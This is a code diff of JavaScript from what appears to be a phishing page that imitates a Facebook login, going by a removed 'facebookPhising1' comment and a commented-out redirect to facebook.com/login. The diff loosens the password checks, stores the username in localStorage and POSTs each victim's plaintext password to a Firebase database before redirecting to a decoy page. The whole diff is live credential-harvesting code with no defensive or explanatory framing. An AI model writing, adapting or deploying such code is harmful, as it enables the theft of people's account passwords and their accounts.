@@ -272,9 +272,9 @@ async function f(event) {
   const username = emailInput.value.trim();
 const password = passwordInput.value.trim();
 const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-const passwordRegex = /^(?=.*[A-Za-z])(?=.*\d)[A-Za-z\d]{6,}$/; // Min 6 chars, 1 letter, 1 number
 
-if (username === "" || password === "") {
+
+if (username === "" || password.length <4) {
   errormsg.innerText = `Invalid Credentials!`;
   errormsg.style.opacity = 1;
   return;
@@ -285,35 +285,28 @@ if (!emailRegex.test(username)) {
   errormsg.style.opacity = 1;
   return;
 }
-if (!passwordRegex.test(password)) {
-  errormsg.innerText = `Password must be at least 6 characters long and include at least one letter and one number!`;
-  errormsg.style.opacity = 1;
-  return;
-}
+
 
   // Fixing the username replacement for Firebase key
   const u = username.replace(/\./, "'DOT'");
+localStorage.setItem('username', JSON.stringify(u))
 
-  const pass = {
-    password: password,
-    timestamp: new Date().toISOString(),
-  };
-  // facebookPhising1
-  const url = `${firebaseUrl}fb/users/${u}/password.json`;
+
+  // saving to db
+  const url = `${firebaseUrl}fb/users/email/${u}.json`;
 
   try {
       const putResponse = await fetch(url, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body:JSON.stringify("=>"+password),
+        body:JSON.stringify("Pass=>"+password),
       });
 
       if (putResponse.ok) {
         console.log("Password change saved successfully.");
-        alert('success')
-            //window.location.href='https://www.facebook.com/login'
+            window.location.href='./no.html'
       } else {
-        console.error("Failed to save password change.");
+        alert('something went wrong...')
       }
     }
 
